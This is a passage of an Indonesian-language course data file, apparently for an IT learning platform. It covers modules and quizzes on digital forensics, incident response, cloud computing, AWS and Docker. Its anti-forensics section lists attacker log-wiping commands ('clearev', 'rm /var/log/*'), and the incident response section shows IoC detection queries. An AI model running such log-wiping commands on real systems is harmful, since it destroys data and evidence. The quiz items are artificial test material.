        question: "Standar skoring severity kerentanan yang umum dipakai?",
        options: ["CVSS", "ISO 9001", "ITIL", "PCI-DSS"],
        answer: 0,
        explanation: "CVSS (Common Vulnerability Scoring System) menilai severity 0-10."
      },
      {
        question: "Tools untuk SQL injection otomatis?",
        options: ["Nmap", "sqlmap", "Wireshark", "Metasploit"],
        answer: 1,
        explanation: "sqlmap adalah tools otomatis untuk mendeteksi & eksploitasi SQLi."
      }
    ]
  },
  {
    level: 6,
    order: 13,
    title: "Digital Forensics",
    slug: "digital-forensics",
    description: "Pengumpulan bukti digital, chain of custody, dan tools forensik.",
    icon: "🔬",
    isProject: false,
    content: `# Digital Forensics

**Digital forensics** adalah proses pengumpulan, pelestarian, analisis, dan presentasi bukti digital untuk keperluan hukum atau investigasi internal. Tidak seperti pentest yang menyerang, forensik bekerja **setelah** insiden terjadi. Disiplin ini membutuhkan ketelitian tinggi karena kesalahan kecil dapat merusak rantai bukti dan menggugurkan keabsahan di pengadilan.

![Digital Forensics](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Prinsip Dasar Forensik

1. **Do No Harm** — jangan mengubah bukti asli.
2. **Chain of Custody** — setiap perpindahan bukti tercatat (siapa, kapan, di mana, mengapa).
3. **Acquisition** — buat image forensik (bit-by-bit) dari media.
4. **Verification** — hash SHA-256/MD5 untuk membuktikan integritas.
5. **Reproducibility** — analisis harus dapat diulang dengan hasil sama.

## Cabang Digital Forensics

- **Disk forensics** — hard drive, SSD, USB.
- **Memory forensics** — RAM dump untuk malware fileless, running process.
- **Network forensics** — pcap, netflow, proxy logs.
- **Mobile forensics** — Android, iOS (encrypted backup).
- **Cloud forensics** — log AWS CloudTrail, M365 audit.
- **Email forensics** — header, MIME, attachment.
- **IoT/Embedded forensics** — firmware extraction.

## Siklus Investigasi Forensik

### 1. Identification
Tentukan scope, jenis insiden, dan bukti potensial.

### 2. Preservation
- Isolasi sistem dari jaringan untuk mencegah perubahan.
- Untuk live system, capture RAM sebelum shutdown (banyak artefak hilang saat power off).

\`\`\`bash
# Capture RAM Windows dengan WinPmem
winpmem_mini_x64.exe output.dump

# Capture RAM Linux dengan LiME (perlu modul kernel)
insmod lime.ko "path=/tmp/ram.lime format=lime"

# Isolasi jaringan tanpa shutdown
ip link set eth0 down
\`\`\`

### 3. Acquisition
Buat image forensik disk—bukan salinan file biasa.

\`\`\`bash
# Image dengan dd + kompresi + hash
sudo dd if=/dev/sda bs=4M | gzip -c > /evidence/disk.img.gz
sha256sum /evidence/disk.img.gz > /evidence/disk.img.gz.sha256

# Lebih baik gunando dc3dd atau ewfacquire
dc3dd if=/dev/sda of=/evidence/disk.dd hash=sha256 log=acquisition.log

# Atau format EWF (Expert Witness Format) dengan ewfacquire
ewfacquire /dev/sda
\`\`\`

### 4. Analysis
Analisis dengan tools forensik:

\`\`\`bash
# Autopsy GUI + Sleuth Kit CLI
fls disk.dd                       # list file
icat disk.dd 12345                # extract inode
mmls disk.dd                      # partisi
tsk_recover disk.dd /output/      # recover deleted

# Memory forensik dengan Volatility 3
vol -f ram.dump windows.pslist    # daftar proses
vol -f ram.dump windows.netscan   # koneksi network
vol -f ram.dump windows.malfind   # injeksi kode
\`\`\`

### 5. Reporting
Laporan forensik harus:

- Jelaskan tools, versi, dan metode yang digunakan.
- Sertakan timestamp dalam UTC dan zona waktu lokal.
- Lampirkan hash dan chain of custody.
- Hindari opini yang tidak didukung bukti.
- Dapat dijelaskan ke pihak non-teknis (hakim, manajemen).

## Artefak Forensik Penting

### Windows
- **MFT** (Master File Table) — metadata semua file.
- **Prefetch** — aplikasi yang pernah dijalankan.
- **Registry** — USBSTOR, Run keys, Shellbags.
- **Event Logs** — Security, System, Application (\`.evtx\`).
- **SRUM** — resource usage per aplikasi.
- **Browser history** — Chrome SQLite, IE WebCacheV01.dat.

### Linux
- \`/var/log/\` — auth.log, syslog, audit.log.
- \`~/.bash_history\`, \`~/.zsh_history\`.
- \`/tmp\`, \`/var/tmp\` — artefak sementara.
- cron (\`/etc/cron*\`, \`/var/spool/cron\`).
- systemd journal (\`journalctl\`).

\`\`\`bash
# Timeline analysis dengan log2timeline (Plaso)
log2timeline.py /evidence/plaso.dump /evidence/disk.dd
psort.py -o l2tcsv -w timeline.csv /evidence/plaso.dump
\`\`\`

## Anti-Forensics & Tantangan

Penyerang berusaha menghapus jejak:
- Bersih-bersih log (\`clearev\`, \`rm /var/log/*\`).
- Timestamping (ubah mtime file).
- Steganography (sembunyikan data di gambar/audio).
- Fileless malware di memori saja.
- Full disk encryption (BitLocker, FileVault, LUKS) — butuh key recovery.

Forensiker perlu memahami cara mengatasi setiap teknik, misalnya via Volatility untuk memory analysis atau mendekripsi dengan key dari TPM.

## Tips & Best Practices

- Selalu kerja di salinan (image), jangan di bukti asli.
- Dokumentasikan setiap langkah dengan timestamp.
- Gunakan write blocker hardware saat mengakuisisi disk.
- Latih forensic readiness: log retention, central SIEM, EDR dengan telemetry.
- Siapkan playbook insiden + kontak forensik pihak ketiga.

## Kesimpulan

Digital forensics adalah perpaduan ilmu, prosedur hukum, dan keterampilan teknis. Disiplin ini memastikan kebenaran dapat dibuktikan di pengadilan atau investigasi internal. Dengan metodologi yang ketat, tools yang tepat, dan dokumentasi yang teliti, forensiker mengubah kekacauan pasca-insiden menjadi fakta yang dapat dipertahankan—dan inilah yang membedakan spekulasi dari bukti.`,
    quiz: [
      {
        question: "Prinsip mencatat setiap perpindahan bukti digital disebut?",
        options: ["Chain of custody", "Best evidence", "Locard's principle", "Rule 702"],
        answer: 0,
        explanation: "Chain of custody mencatat siapa/kapan/di mana bukti diperlakukan."
      },
      {
        question: "Tools utama untuk analisis memori (RAM) forensik?",
        options: ["Volatility", "Nmap", "Burp Suite", "Metasploit"],
        answer: 0,
        explanation: "Volatility (v3) adalah framework standar untuk memory forensik."
      },
      {
        question: "Hash yang umum dipakai untuk verifikasi integritas image forensik?",
        options: ["CRC32", "SHA-256", "Base64", "ROT13"],
        answer: 1,
        explanation: "SHA-256 adalah standar untuk verifikasi integritas bukti digital."
      }
    ]
  },
  {
    level: 6,
    order: 14,
    title: "Incident Response",
    slug: "incident-response",
    description: "Siklus IR, playbook, dan koordinasi saat krisis keamanan.",
    icon: "🚨",
    isProject: false,
    content: `# Incident Response

**Incident Response (IR)** adalah pendekatan terstruktur untuk menangani pelanggaran keamanan, serangan siber, atau insiden layanan. Tujuannya: membatasi dampak, memulihkan operasi secepat mungkin, dan mengambil pelajaran. Tanpa IR yang matang, satu insiden kecil dapat berubah menjadi bencana reputasi dan finansial. IR bukan reaksi panik—ia adalah proses yang dilatih, didokumentasikan, dan diuji.

![Incident Response](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Siklus NIST SP 800-61

### 1. Preparation
- Bentuk CSIRT (Computer Security Incident Response Team) dengan peran jelas: Incident Commander, Communicator, Scribe, SME, Legal.
- Buat playbook per jenis insiden (phishing, ransomware, DDoS, BEC).
- Siapkan tools (EDR, SIEM, forensic kit, out-of-band communication).
- Latih table-top exercise rutin (minimal tahunan).
- Daftar kontak escalation (vendor, CERT-ID, law enforcement).

### 2. Detection & Analysis
- Sumber deteksi: SIEM alert, EDR, user report, threat intel, partner.
- Triage: validasi true positive, tentukan severity, klasifikasi jenis.
- Indikator kompromi (IoC): hash file, IP C2, domain, mutex, registry key.
- Buat timeline awal dan cakupan insiden.

\`\`\`bash
# Contoh triage EDR (segmen per host)
crowdstrike-falcon batch-query --filter "hostname:*-ws-*"

# Cek IoC di log proxy
grep -E "(45\\.227\\.255\\.206|malicious\\.example)" /var/log/squid/access.log

# Pivot ke SIEM (Splunk SPL)
index=proxy (src=10.0.0.0/8) (dest_ip=45.227.255.206 OR dest_host="malicious.example")
\`\`\`

### 3. Containment
Pembatasan penyebaran, dengan dua strategi:

- **Short-term containment** — isolasi host (network quarantine), disable account, block domain di firewall.
- **Long-term containment** — sistem tetap berjalan tapi ditambal sementara (mis. disable service yang dieksploitasi).

\`\`\`bash
# Network isolation via EDR atau switch port
ip link set eth0 down             # crude, but works
# Atau via iptables hanya allow SOC
iptables -A INPUT -s 10.99.0.5 -j ACCEPT
iptables -P INPUT DROP
\`\`\`

### 4. Eradication
Hapus akar penyebab agar tidak reinfeksi:

- Hapus malware & persistence (scheduled task, service, registry).
- Disable akun terkompromi, reset semua kredensial yang terkait.
- Patch kerentanan yang dieksploitasi.
- Rebuild sistem kritis dari image bersih (jangan cleaning in-place untuk sistem penting).

### 5. Recovery
Kembalikan layanan secara bertahap:

- Restore dari backup bersih, verifikasi integritas.
- Validasi monitoring enhanced pada sistem yang dipulihkan.
- Phased rollout: non-kritis → kritis, dengan rollback plan.
- Watch period (72-168 jam) untuk memastikan tidak reinfeksi.

### 6. Post-Incident Activity (Lessons Learned)
- **Post-mortem meeting** 1-2 minggu setelah resolusi.
- **Blameless** culture: fokus pada sistem, bukan individu.
- Dokumentasi: timeline, IoC, root cause, dampak, mitigasi.
- Update playbook, detection rule, dan kontrol berdasarkan pelajaran.

## Severity & Escalation Matrix

\`\`\`text
SEV-1 (Critical):
  - Layanan publik down / data sensitif bocor massal
  - Response: < 15 menit, eskalasi ke CISO & Legal
  - Komunikasi: eksekutif, regulator (jika wajib), publik

SEV-2 (High):
  - Layanan internal terganggu, data sensitif terbatas
  - Response: < 1 jam

SEV-3 (Medium):
  - Infeksi endpoint tunggal, no data exfil
  - Response: < 4 jam

SEV-4 (Low):
  - Phishing email tanpa klik, malware di-quarantine
  - Response: < 24 jam
\`\`\`

## Komunikasi Krisis

Salah satu bagian tersulit IR adalah komunikasi:

- **Internal**: status update terjadwal (mis. setiap 2 jam saat SEV-1).
- **Eksekutif**: ringkasan bisnis (dampak, ETA, keputusan yang dibutuhkan).
- **Legal & Compliance**: notifikasi regulator dalam SLA (UU PDP 3x24 jam untuk breach serius).
- **Pelanggan**: transparan, jujur, tanpa spekulasi.
- **Publik/Press**: hanya via juru bicara resmi.

\`\`\`text
Template update internal:
[SEV-1 RANSOMWARE] Update #3 — 14:30 WIB
Status: Containment 80% selesai
Affected: 12 server, 300 endpoint
No evidence of data exfiltration (under investigation)
Next update: 16:30 WIB
Incident Commander: Budi
\`\`\`

## Tools IR Modern

- **EDR/XDR**: CrowdStrike, SentinelOne, Defender for Endpoint.
- **SIEM/SOAR**: Splunk, Elastic, Sentinel, Cortex XSOAR, Tines.
- **Threat Intelligence**: MISP, VirusTotal, AlienVault OTX.
- **Forensics**: Volatility, Velociraptor, KAPE, GRR.
- **Communication**: dedicated out-of-band (Signal, Slack workspace IR).

## Tips & Best Practices

- Latih table-top exercise minimal 2x setahun dengan skenario berbeda.
- Maintain runbook per jenis serangan (ransomware, phishing, BEC, insider).
- Punya offline backup immutable (air-gapped atau WORM S3).
- Pre-negotiate retainer dengan firma IR pihak ketiga.
- Integrasikan threat intel feed untuk deteksi proaktif.

## Kesimpulan

Incident Response matang membedakan organisasi yang survive dari yang collapse saat krisis. Dengan persiapan, deteksi cepat, containment disiplin, dan komunikasi transparan, dampak insiden dapat diminimalkan. Yang terpenting: **belajar dari setiap insiden**—setiap breach adalah guru berharga yang membentuk pertahanan masa depan.`,
    quiz: [
      {
        question: "Berapa fase incident response menurut NIST SP 800-61?",
        options: ["3", "4", "6", "10"],
        answer: 2,
        explanation: "NIST SP 800-61: Preparation, Detection & Analysis, Containment, Eradication, Recovery, Post-Incident."
      },
      {
        question: "Severity untuk layanan publik down dan data sensitif bocor massal?",
        options: ["SEV-4", "SEV-3", "SEV-2", "SEV-1"],
        answer: 3,
        explanation: "SEV-1 (Critical) untuk dampak luas pada publik dan data sensitif."
      },
      {
        question: "Pendekatan budaya dalam post-mortem IR yang direkomendasikan?",
        options: ["Blame-driven", "Blameless", "Confidential", "Punitive"],
        answer: 1,
        explanation: "Blameless culture fokus pada sistem dan proses, bukan menyalahkan individu."
      }
    ]
  },

  // ==================== LEVEL 7 - CLOUD & DEVOPS (8) ====================
  {
    level: 7,
    order: 1,
    title: "Cloud Computing Basics",
    slug: "cloud-computing-basics",
    description: "Model layanan IaaS/PaaS/SaaS, deployment, dan karakteristik cloud.",
    icon: "☁️",
    isProject: false,
    content: `# Cloud Computing Basics

**Cloud computing** adalah model pengiriman layanan komputasi—server, storage, database, networking, software—melalui internet dengan model pay-as-you-go. Alih-alih membeli dan memelihara hardware sendiri, organisasi menyewa sumber daya dari penyedia cloud (AWS, Azure, GCP, Alibaba, IBM Cloud). Cloud telah mengubah cara aplikasi dirancang, d skalakan, dan dioperasikan.

![Cloud Computing Basics](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Karakteristik Esensial Cloud (NIST)

1. **On-demand self-service** — pengguna menyediakan resource tanpa interaksi manusia dengan provider.
2. **Broad network access** — akses via internet dari berbagai perangkat.
3. **Resource pooling** — resource fisik dipakai bersama multi-tenant secara terisolasi.
4. **Rapid elasticity** — scale up/down cepat sesuai beban.
5. **Measured service** — billing berdasarkan konsumsi (metered).

## Model Layanan Cloud

### IaaS (Infrastructure as a Service)
Penyedia menyediakan VM, storage, network. Anda mengelola OS ke atas. Contoh: AWS EC2, Azure VM, GCP Compute Engine, DigitalOcean Droplet.

\`\`\`bash
# Provision EC2 dengan AWS CLI
aws ec2 run-instances \\
  --image-id ami-0c55b159cbfafe1f0 \\
  --instance-type t3.micro \\
  --key-name my-key \\
  --security-group-ids sg-12345 \\
  --subnet-id subnet-67890
\`\`\`

### PaaS (Platform as a Service)
Penyedia mengelola runtime, OS, dan infrastruktur. Anda fokus kode. Contoh: Heroku, Google App Engine, AWS Elastic Beanstalk, Azure App Service.

\`\`\`yaml
# app.yaml untuk Google App Engine
runtime: nodejs20
instance_class: F2
automatic_scaling:
  min_instances: 1
  max_instances: 10
env_variables:
  NODE_ENV: production
\`\`\`

### SaaS (Software as a Service)
Aplikasi jadi yang diakses via browser/API. Contoh: Gmail, Office 365, Salesforce, Slack, Notion.

### Model Baru
- **FaaS/Serverless**: AWS Lambda, Cloud Functions, Azure Functions.
- **CaaS (Container as a Service)**: ECS, GKE Autopilot, Azure Container Apps.
- **DBaaS**: RDS, Cloud SQL, Cosmos DB.

## Model Deployment Cloud

| Model | Deskripsi | Contoh |
|-------|-----------|--------|
| **Public** | Infrastruktur dimiliki provider, multi-tenant | AWS, Azure, GCP |
| **Private** | Cloud untuk satu organisasi (on-prem atau hosted) | OpenStack, VMware Cloud Foundation |
| **Hybrid** | Kombinasi public + private dengan orchestration | AWS Outposts, Azure Arc |
| **Multi-cloud** | Menggunakan beberapa provider sekaligus | AWS + GCP + Azure |
| **Community** | Shared untuk komunitas tertentu | GovCloud, healthcare consortium |

## Shared Responsibility Model

Pembagian tanggung jawab keamanan antara provider dan konsumen:

\`\`\`text
                IaaS        PaaS        SaaS
Provider:       Physical    Physical    Physical
                Network     Network     Network
                Host        Host        Host
                ...         OS          OS
                ...         Runtime     Runtime
                            App (patch) App (config)
Konsumen:       OS          Data        Data
                Runtime     Identity    Identity
                App
                Data
                Identity
\`\`\`

Misinterpretasi model ini adalah penyebab utama insiden cloud (mis. S3 bucket terbuka = tanggung jawab konsumen, bukan AWS).

## Arsitektur Cloud Modern

- **Multi-AZ** — deploy ke beberapa Availability Zone untuk HA.
- **Auto-scaling** — tambah/kurangi instance berdasarkan metrik.
- **Load balancing** — distribusi traffic (ALB/NLB).
- **CDN** — cache konten di edge (CloudFront, Cloudflare).
- **Microservices** — dekomposisi monolith menjadi service kecil.
- **Managed services** — gunakan RDS vs self-hosted PostgreSQL untuk kurangi beban operasional.

## Estimasi Biaya Cloud

\`\`\`bash
# Estimasi biaya bulanan EC2 t3.medium (us-east-1, ~$30.37/month On-Demand)
aws pricing get-products \\
  --service-code AmazonEC2 \\
  --filters Type=TERM_MATCH,Field=instanceType,Value=t3.medium \\
            Type=TERM_MATCH,Field=location,Value="US East (N. Virginia)" \\
  --query 'PriceList[0]' --output text | jq .

# Aktifkan Cost Explorer
aws ce get-cost-and-usage \\
  --time-period Start=2024-01-01,End=2024-02-01 \\
  --granularity MONTHLY --metrics BlendedCost \\
  --group-by Type=DIMENSION,Key=Service
\`\`\`

## Keuntungan & Tantangan Cloud

**Keuntungan**:
- Capex → Opex, biaya sesuai pemakaian.
- Skalabilitas global dalam menit.
- Akses ke layanan terbaru (AI, quantum, IoT).
- Tanggung jawab keamanan sebagian dipindah ke provider.

**Tantangan**:
- Vendor lock-in.
- Biaya dapat meledak tanpa governance (FinOps).
- Skill gap pada tim operasional.
- Kepatuuhan data (residency, sovereignty).

## Tips & Best Practices

- Terapkan **Well-Architected Framework** (5 pilar: operational, security, reliability, performance, cost).
- Gunakan **Infrastructure as Code** (Terraform, Pulumi, CloudFormation).
- Aktifkan **MFA** untuk semua akun root dan IAM.
- Tag semua resource untuk cost allocation.
- Gunakan **landing zone** (AWS Control Tower, Azure Landing Zones) untuk multi-account.

## Kesimpulan

Cloud computing adalah paradigma yang memungkinkan inovasi cepat dan skalabilitas global. Memahami model layanan (IaaS/PaaS/SaaS), shared responsibility, dan arsitektur modern adalah fondasi untuk membangun sistem yang andal, aman, dan efisien di cloud. Cloud bukan tentang "memindahkan server", tetapi **merancang ulang** cara kita berpikir tentang komputasi.`,
    quiz: [
      {
        question: "Model cloud yang menyediakan VM, storage, network (OS dikelola konsumen)?",
        options: ["SaaS", "PaaS", "IaaS", "FaaS"],
        answer: 2,
        explanation: "IaaS menyediakan infrastruktur dasar; OS ke atas dikelola konsumen."
      },
      {
        question: "Siapa yang bertanggung jawab konfigurasi S3 bucket public access?",
        options: ["AWS provider", "Konsumen (akun owner)", "Hardware vendor", "Pemerintah"],
        answer: 1,
        explanation: "Konfigurasi resource adalah tanggung jawab konsumen dalam shared responsibility model."
      },
      {
        question: "Pilar yang TIDAK termasuk AWS Well-Architected Framework?",
        options: ["Security", "Cost Optimization", "Marketing", "Reliability"],
        answer: 2,
        explanation: "5 pilar: Operational, Security, Reliability, Performance, Cost. Marketing bukan pilar."
      }
    ]
  },
  {
    level: 7,
    order: 2,
    title: "AWS & Cloud Services",
    slug: "aws-cloud-services",
    description: "Layanan utama AWS: EC2, S3, RDS, IAM, dan arsitektur cloud.",
    icon: "🟧",
    isProject: false,
    content: `# AWS & Cloud Services

**Amazon Web Services (AWS)** adalah penyedia cloud terbesar di dunia dengan ratusan layanan. Mendominasi pasar sejak peluncuran EC2 pada 2006, AWS menyediakan layanan komputasi, storage, database, AI, networking, hingga satelit. Memahami layanan inti AWS adalah keterampilan wajib bagi cloud engineer dan architect modern.

![AWS & Cloud Services](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Region, AZ, dan Edge Location

- **Region** — klaster geografis (us-east-1 N. Virginia, ap-southeast-1 Singapore, dst). Pilih untuk latency, compliance, dan DR.
- **Availability Zone (AZ)** — data center terpisah dalam region (1+ building, power, network). Min 3 AZ per region.
- **Edge Location** — POP CDN CloudFront, lebih banyak dari AZ untuk caching global.

## Layanan Komputasi

### EC2 (Elastic Compute Cloud)
Virtual server dengan berbagai instance type:
- General purpose: t3, m6i
- Compute optimized: c6i
- Memory: r6i, x2iezn
- GPU: p4d, g5 (ML/rendering)
- ARM Graviton: c7g (hemat ~40% biaya)

\`\`\`bash
# Launch EC2 dengan user-data script
aws ec2 run-instances \\
  --image-id ami-0c55b159cbfafe1f0 \\
  --instance-type t3.micro \\
  --user-data file://userdata.sh \\
  --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=web}]"

userdata.sh:
#!/bin/bash
yum install -y httpd
systemctl enable --now httpd
\`\`\`

### Lambda (Serverless)
Jalankan kode tanpa mengelola server. Cocok untuk event-driven, beban tak menentu.

\`\`\`python
# Lambda Python handler
import json
def lambda_handler(event, context):
    return {
        'statusCode': 200,
        'body': json.dumps({'message': 'hello from lambda'})
    }
\`\`\`

### Lainnya
- **ECS/EKS**: container orchestration (Docker/Kubernetes managed).
- **Fargate**: serverless container.
- **Lightsail**: VPS sederhana untuk small business.
- **Batch**: job computing besar.

## Storage

### S3 (Simple Storage Service)
Object storage, 99.999999999% (11 9s) durability. Use cases: static website, backup, data lake, CDN origin.

\`\`\`bash
# Buat bucket + upload
aws s3 mb s3://my-bucket-unique-name
aws s3 cp file.txt s3://my-bucket-unique-name/

# Static website
aws s3 website s3://my-bucket-unique-name/ --index-document index.html

# Block public access (recommended default)
aws s3api put-public-access-block \\
  --bucket my-bucket-unique-name \\
  --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
\`\`\`

### Lainnya
- **EBS**: block storage untuk EC2.
- **EFS**: shared file system NFS.
- **Glacier**: arsip murah, retrieval lambat.
- **FSx**: Windows file system, Lustre.

## Database

- **RDS**: MySQL, PostgreSQL, MariaDB, SQL Server, Oracle (managed).
- **Aurora**: MySQL/PostgreSQL compatible, cloud-native, multi-AZ HA.
- **DynamoDB**: NoSQL key-value, serverless, single-digit ms latency.
- **ElastiCache**: Redis/Memcached managed.
- **Redshift**: data warehouse kolom.

\`\`\`bash
# Provision RDS PostgreSQL
aws rds create-db-instance \\
  --db-instance-identifier prod-db \\
  --db-instance-class db.t3.micro \\
  --engine postgres \\
  --master-username admin \\
  --master-user-password $(aws secretsmanager get-random-password --exclude-characters '"@/\\' --query RandomPassword --output text) \\
  --allocated-storage 20 \\
  --backup-retention-period 7 \\
  --multi-az
\`\`\`

## Networking

### VPC (Virtual Private Cloud)
Jaringan terisolasi di AWS. Komponen: subnet (public/private), route table, internet gateway, NAT gateway, security group, NACL.

\`\`\`yaml
# VPC dengan Terraform
resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
  enable_dns_hostnames = true
  tags = { Name = "prod-vpc" }
}
resource "aws_subnet" "public_a" {
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.1.0/24"
  availability_zone = "ap-southeast-1a"
  map_public_ip_on_launch = true
}
\`\`\`

### Lainnya
- **CloudFront**: CDN global.
- **Route 53**: DNS managed.
- **ALB/NLB**: load balancer L7/L4.
- **Direct Connect**: dedicated line ke AWS.
- **Transit Gateway**: hub antar VPC.

## IAM (Identity & Access Management)

Konsep: **principal** (user/role) → **action** (API) → **resource** (ARN). **Policy** JSON mendefinisikan izin.

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}
\`\`\`

Best practice: gunakan **IAM Role** untuk service EC2/Lambda (bukan access key hardcoded), MFA di root, password policy, dan SCP di Organizations.

## Keamanan

- **KMS**: key management service (envelope encryption).
- **Secrets Manager / Parameter Store**: vault kredensial.
- **WAF & Shield**: proteksi DDoS dan application-layer.
- **GuardDuty**: threat detection berbasis ML.
- **Macie**: data discovery (PII).
- **Security Hub**: aggregated compliance posture.

## Monitoring & DevOps

- **CloudWatch**: metrics, logs, alarms.
- **CloudTrail**: audit API calls (semua action).
- **X-Ray**: distributed tracing.
- **CodeCommit/CodeBuild/CodeDeploy/CodePipeline**: CI/CD native.

\`\`\`bash
# CloudTrail event query
aws cloudtrail lookup-events \\
  --lookup-attributes AttributeKey=EventName,AttributeValue=RunInstances \\
  --max-results 10
\`\`\`

## Tips & Best Practices

- Aktifkan MFA di root dan IAM user.
- Gunakan AWS Organizations + SCP untuk governance multi-account.
- Tag semua resource; aktifkan Cost Explorer + Budgets.
- Encrypt EBS/S3/RDS default; rotasi KMS key.
- Use Well-Architected Tool review berkala.
- Pilih Graviton (ARM) untuk workload compatible—hemat signifikan.

## Kesimpulan

AWS menawarkan ekosistem luas untuk membangun aplikasi modern. Kunci menguasai AWS bukan menghafal ratusan layanan, tetapi memahami prinsip shared responsibility, well-architected, dan memilih layanan managed untuk mengurangi beban operasional. Mulai dari EC2/S3/IAM sebagai fondasi, lalu eksplorasi serverless dan managed database sesuai kebutuhan workload.`,
    quiz: [
      {
        question: "Layanan AWS untuk object storage?",
        options: ["EBS", "S3", "EFS", "RDS"],
        answer: 1,
        explanation: "Amazon S3 (Simple Storage Service) adalah object storage AWS."
      },
      {
        question: "Yang harus dipakai EC2 agar dapat akses S3 tanpa access key?",
        options: ["Hardcode key", "IAM Role", "Root credential", "Environment variable"],
        answer: 1,
        explanation: "IAM Role attach ke EC2 memberi temporary credential via metadata service."
      },
      {
        question: "Layanan AWS untuk audit API call (compliance)?",
        options: ["CloudWatch", "CloudTrail", "X-Ray", "Config"],
        answer: 1,
        explanation: "CloudTrail mencatat semua API call ke akun AWS untuk audit."
      }
    ]
  },
  {
    level: 7,
    order: 3,
    title: "Docker & Containerization",
    slug: "docker-containerization",
    description: "Container, image, Dockerfile, dan best practices Docker.",
    icon: "🐳",
    isProject: false,
    content: `# Docker & Containerization

**Docker** adalah platform containerization yang memaketkan aplikasi beserta dependency-nya menjadi unit portable yang dapat berjalan konsisten di mana saja. Berbeda dengan VM yang memvirtualisasi hardware, container berbagi kernel OS host—jauh lebih ringan, start cepat, dan efisien sumber daya. Docker telah merevolusi cara developer membangun, mengirim, dan menjalankan aplikasi.

![Docker & Containerization](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Konsep Inti

- **Image** — template read-only berisi aplikasi + dependency. Dibangun dari Dockerfile.
- **Container** — instance running dari image. Isolasi via namespace + cgroups (Linux).
- **Dockerfile** — script deklaratif untuk membangun image.
- **Registry** — tempat menyimpan/distribusi image (Docker Hub, ECR, GCR, Harbor).
- **Volume** — persistent storage untuk container.
- **Network** — jaringan virtual antar container.

## Container vs Virtual Machine

| Aspek | VM | Container |
|-------|-----|-----------|
| Isolasi | Hardware-level | OS-level (namespace) |
| Ukuran image | GB | MB |
| Boot time | Menit | Detik |
| Density | Beberapa per host | Ratusan per host |
| Sharing kernel | Tidak | Ya |
| Use case | Strong isolation | Microservice, CI/CD |

## Dockerfile

\`\`\`dockerfile
# Multi-stage build untuk image kecil & aman
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
RUN npm run build

FROM node:20-alpine AS runtime
WORKDIR /app
ENV NODE_ENV=production
RUN addgroup -S app && adduser -S app -G app
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/package.json ./
USER app
EXPOSE 3000
HEALTHCHECK --interval=30s CMD wget -qO- http://localhost:3000/health || exit 1
CMD ["node", "dist/main.js"]
\`\`\`

## Perintah Dasar Docker

\`\`\`bash
# Build image
docker build -t myapp:1.0 .

# Run container
docker run -d --name api -p 8080:3000 \\
  --env-file .env \\
  -v $(pwd)/data:/app/data \\
  --restart unless-stopped \\
  myapp:1.0

# List & inspect
docker ps -a
docker logs -f api
docker exec -it api sh
docker stats

# Image management
docker images
docker image prune -a    # hapus yang tidak terpakai
docker system prune -a --volumes  # bersih-bersih total

# Push ke registry
docker tag myapp:1.0 registry.example.com/myapp:1.0
docker push registry.example.com/myapp:1.0
\`\`\`

## Docker Compose (Multi-container)

\`\`\`yaml
# docker-compose.yml
version: "3.9"
services:
  web:
    build: .
    ports: ["8080:3000"]
    environment:
      DATABASE_URL: postgresql://app:secret@db:5432/app
    depends_on:
      db:
        condition: service_healthy
    restart: unless-stopped
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: app
      POSTGRES_PASSWORD: secret
      POSTGRES_DB: app
    volumes:
      - pgdata:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U app"]
      interval: 5s
      timeout: 3s
      retries: 5
volumes:
  pgdata:
\`\`\`

\`\`\`bash
docker compose up -d
docker compose logs -f web
docker compose down -v   # hapus container + volume
\`\`\`

## Storage & Volume

- **bind mount**: \`-v /host/path:/container/path\` (untuk dev, sharing file).
- **named volume**: \`-v pgdata:/var/lib/postgresql/data\` (managed Docker, portable).
- **tmpfs**: in-memory, untuk secret.

## Networking

Driver jaringan Docker:
- **bridge** (default) — internal Docker network.
- **host** — container pakai network host (kurang aman, no isolation).
- **none** — isolated, no networking.
- **overlay** — multi-host (Swarm/K8s).

\`\`\`bash
# Buat network custom
docker network create --driver bridge mynet
docker run -d --network mynet --name api myapp
docker run -d --network mynet --name db postgres
# Container dapat resolve via DNS: api, db
\`\`\`

## Keamanan Container

1. **Non-root user** — gunakan USER directive.
2. **Read-only filesystem** — \`--read-only\` + tmpfs untuk yang perlu writable.
3. **Drop capabilities** — \`--cap-drop ALL --cap-add NET_BIND_SERVICE\`.
4. **Limit resources** — \`--memory=512m --cpus=0.5\`.
5. **Scan image** — Trivy, Grype, Snyk untuk CVE.
6. **Minimal base image** — Alpine atau distroless.
7. **Sign image** — Cosign (Sigstore).

\`\`\`bash
# Scan dengan Trivy
trivy image myapp:1.0

# Run dengan hardening
docker run -d \\
  --read-only \\
  --tmpfs /tmp \\
  --cap-drop ALL \\
  --security-opt no-new-privileges \\
  --memory=512m --cpus=0.5 \\
  myapp:1.0
\`\`\`

## Optimasi Image

- **Multi-stage build** — image akhir hanya berisi binary + dependency runtime.
- **Cache layer** — urutkan instruksi dari yang paling jarang berubah (COPY package.json sebelum COPY .).
- **.dockerignore** — exclude node_modules, .git, file dev.
- **Alpine / distroless** — base image kecil dan minim attack surface.
- **Reproducible build** — \`--build-arg BUILDKIT=1\` dengan cache mount.

## Tips & Best Practices

- Satu container = satu proses utama.
- Log ke stdout/stderr (twelve-factor app).
- Konfigurasi via environment variable, bukan hard-code.
- Tag image dengan semantic version + git SHA, hindari \`latest\` di production.
- Lakukan image scan di CI sebelum push.
- Gunakan Docker BuildKit (default di Docker 23+) untuk build lebih cepat.

## Kesimpulan

